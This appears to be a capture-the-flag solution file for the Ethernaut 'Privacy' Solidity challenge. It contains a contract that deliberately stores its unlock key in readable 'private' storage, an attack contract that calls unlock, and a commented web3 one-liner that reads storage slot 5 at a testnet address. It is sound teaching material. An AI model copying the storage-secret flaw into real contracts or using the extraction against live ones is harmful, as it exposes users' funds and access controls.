// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
  // slot 0
  bool public locked = true;
  // slot 1
  uint256 public ID = block.timestamp;
  // slot 2 (packs next 3)
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  // slot 3, 4, 5 (one slot per element)
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2])); // reads half the bytes from slot 5
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

// solution used by unit test
// see https://solidity-by-example.org/hacks/accessing-private-data/
// password extracted from storage slots using ethers.js, then passed into
// attack contract to call vulnerable contract
contract PrivacyAttack {
   Privacy vulnContract;

  constructor(address _vulnContract) {
    vulnContract =  Privacy(_vulnContract);
  }

  function attack(bytes16 password) public {
    vulnContract.unlock(password);
  }
}


// solution used to deploy live to testnet
// use web3 browser console to extract password from slot storage
// & to call contract.unlock() with password
// await contract.unlock((await web3.eth.getStorageAt('0x0D41207c1CD7228b38d6075a62B95a553B26d8d9', 5)).slice(0,34));
//
// why slice(0, 34) ? 
// bytes32 has 66 characters
// first two characters 0x then 64 characters for content (1 byte = 2 characters)
// Privacy compares input vs bytes16 (first 32 characters)
// so slice the string by 2 (for "0x" prefix) + 32 (first 32 characters after prefix) = 34